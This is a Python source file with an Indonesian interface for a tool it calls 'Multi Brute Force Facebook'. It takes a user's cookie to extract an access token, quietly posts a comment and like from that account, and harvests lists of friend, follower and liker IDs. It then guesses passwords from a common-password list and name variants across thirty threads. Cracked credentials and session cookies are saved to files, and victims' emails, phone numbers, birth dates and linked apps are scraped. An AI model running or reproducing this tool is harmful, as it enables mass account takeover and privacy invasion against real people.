#!/usr/bin/env python3
import requests,json,os,sys,random,datetime,time,re
from datetime import datetime
from rich.panel import Panel
from rich import print
from rich.console import Console
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich import pretty
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
from rich.panel import Panel as nel
from rich.panel import Panel as panel
from bs4 import BeautifulSoup as parser
from rich.console import Console as sol
from rich.markdown import Markdown as mark
from concurrent.futures import ThreadPoolExecutor as tred
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
pretty.install()
CON=sol()
wa = Console()
taplikasi=[]
gabriel=[]
uidl =[]
opsi=[]
uidf=[]
liu=[]
console = Console()
ses=requests.Session()
id,id2,loop,ok,cp,akun,oprek,lisensiku,tokenku,uid,lisensikuni,method,pwpluss,pwnya= [],[],0,0,0,[],[],[],[],[],[],[],[],[]
ugen2,ugen,dia,cokbrut,dump,memek,ualu,ualuh,lisensikuni,lisensiku,princp=[],[],[],[],[],[],[],[],[],[],[]
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[0;36m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

### LIST DUMP ###
Dump = []
### BANNER OR LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Coded by Rozhak
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold red]    .-.  .-..----. .----.    .----..----.  
[bold red]    }  \/  {| {_} }} |__}___ } |__}| {_} } 
[bold white]    | {  } || {_} }} '_}{___}} '_} | {_} } 
[bold white]    `-'  `-'`----' `--'      `--'  `----'  
[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic red]Gagal Akses Graph Facebook, Kemungkinan Cookies Facebook Sudah Kadaluarsa!", title="[bold hot_pink2]([bold blue]Token Invalid[bold hot_pink2])"));time.sleep(3.2);login_cookie()
### LOGIN USING COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Login Menggunakan Cookie Facebook
[bold green]2[bold white]. Cara Mendapatkan Cookie Facebook
[bold green]3[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
        query = Console().input("[bold hot_pink2]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            cookie = Console().input("[bold hot_pink2]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').text
                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                name, id = dapatkan_nama(cookie, token_eaag)
                Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
        elif query == '2' or query == '02':
            try:
                Console().print("[bold hot_pink2]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold hot_pink2]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
### BOT KOMEN ###
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response2) == 'true':
            return 0
        else:
            return 1
### DAFTAR MENU ###
def daftar_menu():
    banner_logo()
    try:
        cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        negara = requests.get("http://ip-api.com/json/").json()["country"]
        ip = requests.get("http://ip-api.com/json/").json()["query"]
        kota = requests.get("http://ip-api.com/json/").json()["city"]
        region = requests.get("http://ip-api.com/json/").json()["region"]
        times = requests.get("http://ip-api.com/json/").json()["timezone"]
        da = datetime.datetime.now().day
        bu = dic[(str(datetime.datetime.now().month))]
        th = datetime.datetime.now().year
        dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Username : [bold green]{name}[/]\n[bold white][+[/][bold white]][/] [bold white]User Idz : [bold green]{id}[/]\n[bold white][+[/][bold white]][/] [bold white]Tanggal  : [bold green]{da,bu,th}[/][/]\n[bold white][+[/][bold white]][/] [bold white]Status   : [bold green]Premium[/][/]\n[bold white][+[/][bold white]][/] [bold white]Versi Sc : [bold green]Update 3.4[/][/] ',width=43,padding=(0,3),style=f"bold white"))
        dia.append(panel(f'[bold white][+[/][bold white]][/] [bold white]Country  : [bold green]{negara}[/]\n[bold white][+[/][bold white]][/] [bold white]City     : [bold green]{kota}[/]\n[bold white][+[/][bold white]][/] [bold white]Region   : [bold green]{region}[/][/]\n[bold white][+[/][bold white]][/] [bold white]TimeZone : [bold green]{times}[/][/]\n[bold white][+[/][bold white]][/] [bold white]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold white"))
        console.print(Columns(dia))
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
[bold green]2[bold white]. Crack User Dari Pengikut
[bold green]3[bold white]. Crack User Dari Like Postingan
[bold green]4[bold white]. Keluar ([bold red]Logout[bold white])
[bold green]5[bold white]. Ganti UA""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
    query = Console().input("[bold hot_pink2]   ╰─> ")
    if query == '1' or query == '01':
            try:
                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                userid = Console().input("[bold hot_pink2]   ╰─> ")
                for z in userid.split(','):
                    dump().publik(int(z), cookie, unit_cursor = '')
                    if len(Dump) < 50:
                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
                    else:
                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
            except Exception as e:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '2' or query == '02':
            try:
                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                userid = Console().input("[bold hot_pink2]   ╰─> ")
                for z in userid.split(','):
                    dump().pengikut(z, cookie, token_eaag)
                    if len(Dump) < 50:
                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
                    else:
                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
            except Exception as e:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '3' or query == '03':
            try:
                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                postid = Console().input("[bold hot_pink2]   ╰─> ")
                for z in postid.split(','):
                    dump().likes(z, cookie, token_eaag, after = '')
                    if len(Dump) < 1:
                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
                    else:
                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
            except Exception as e:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
    elif query == '4' or query == '04':
            try:
                os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold hot_pink2]   ╰─>[bold green] Keluar Dari Program!", end='\r');time.sleep(3.6);exit()
            except:exit()
    elif query == '5' or query == '05':
            uagent()
    else:
            Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
    
class dump:
    def __init__(self) -> None:
        pass
    def publik(self, userid, cookie, unit_cursor):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'upgrade-insecure-requests': '1',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'host': 'm.facebook.com',
                    'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H321 Safari/600.1.4[FB_IAB/FB4A;FBAV/375.1.0.28.111:]',
                    'accept-language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cookie
                })
                response = r.get('https://m.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(userid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id_friends}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id_friends}|{self.name}')
                if 'Sorry, something went wrong.' in str(response):
                    return 0
                elif 'unit_cursor=' in str(response):
                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                    self.publik(userid, cookie, self.unit_cursor)
                    
                else:
                    crack().setting()
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 3
    ### DUMP PENGIKUT ###
    def pengikut(self, userid, cookie, token_eaag):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
                if 'summary' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        try:
                            self.id, self.name = z['id'], z['name'].lower()
                            if str(self.id) in str(Dump):
                                continue
                            else:
                                Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold hot_pink2]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
    ### DUMP LIKES ###
    def likes(self, postid, cookie, token_eaag, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
                if 'id' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        if str(self.id) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'after\':' in str(response):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    else:
                        return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Gagal {postid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 0
        
class crack:
    def setting():
        Console(width=50, style="bold hot_pink2").print(Panel("""[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]""",subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (CRACK) [bold green]<[bold yellow]<[bold red]<"))
        hu = input(x+'['+p+'f'+x+'] Pilih : ')
        if hu in ['1','01']:
            for bacot in id:
                id2.append(bacot)
        elif hu in ['2','02']:
            for bacot in id:
                id2.insert(0,bacot)
        else:
            ric = '# PILIHAN TIDAK ADA DI MENU'
            sol().print(mark(ric, style='red'))
            exit()
        Console(width=50, style="bold hot_pink2").print(Panel("""[01] Method B-Api\n[02] Method Mobile\n[03] Method Mbasic Selow Crack""",subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (METHOD) [bold green]<[bold yellow]<[bold red]<"))
        hc = input(x+'['+p+'f'+x+'] Pilih : ')
        if hc in ['1','01']:
            method.append('api')
        elif hc in ['3','03']:
            method.append('Mbasic')
        else:
            method.append('mobile')
            guw = '# PILIHAN OPSI CRACK '
            sol().print(mark(guw, style='cyan'))
            aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Terkait ? (y/t) : ')
            if aplik in ['y','Y']:
                taplikasi.append('ya')
            else:
                taplikasi.append('no')
                osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
                if osk in ['y','Y']:
                    oprek.append('ya')
                else:
                    oprek.append('no')
        passwrd()
### CRACK ###
def passwrd():
        ler = '# CRACK DIMULAI'
        sol().print(mark(ler, style='cyan'))
        krek = 'Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
        cetak(nel(krek, title='CRACK'))
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','malang','bismillah123','123455']
                if len(nmf)<6:
                    if len(frs)<3:
                        continue
                    else:
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        if 'mobile' in method:
                            pool.submit(crack,idf,pwv)
                        elif 'api' in method:
                            pool.submit(crack2,idf,pwv)
                        elif 'free' in method:
                            pool.submit(crack3,idf,pwv)
                        else:
                            pool.submit(crack,idf,pwv)
                            print('')
                            tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
                            sol().print(mark(tanya, style='cyan'))
                            woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
                            if woi in ['y','Y']:
                                cek_opsi()
                            else:
                                exit()

    
def crack(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s [YANN-XD] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            tix = time.time()
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf+'|'+pw)
                    ceker(idf,pw)
                else:
                    print('\n')
                    statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='SESI'))
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akun.append(idf+'|'+pw)
                    cp+=1
                    break
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
                if 'no' in taplikasi:
                    ok+=1
                    coki=po.cookies.get_dict()
                    kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                    open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                    print('\n')
                    statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title=' NO SESI'))
                    break
            elif 'ya' in taplikasi:
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                user=idf
                infoakun = ""
                session = requests.Session()
                get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
                response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
                except:nomer = ""
                try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
                except:email=""
                try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
                except:ttl=""
                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
                except:teman = ""
                try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
                except:pengikut = ""
                try:
                    tahun = ""
                    cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                    for nenen in cek_thn:
                        tahun += nenen+", "
                except:pass
                infoakun += (f"[••] Nama Akun       : {nama}\n[••] Jumlah Teman    : {teman}\n[••] Jumlah Pengikut : {pengikut}\n[••] Email Aktif     : {email}\n[••] Nomor Aktif     : {nomer}\n[••] Tahun Akun      : {tahun}\n[••] Tanggal Lahir   : {ttl}\n")
                hit1, hit2 = 0,0
                cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
                    infoakun += (f"Aplikasi Yang Terkait*\n")
                    if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                        infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
                    else:
                        infoakun += (f"	Aplikasi Aktif : \n")
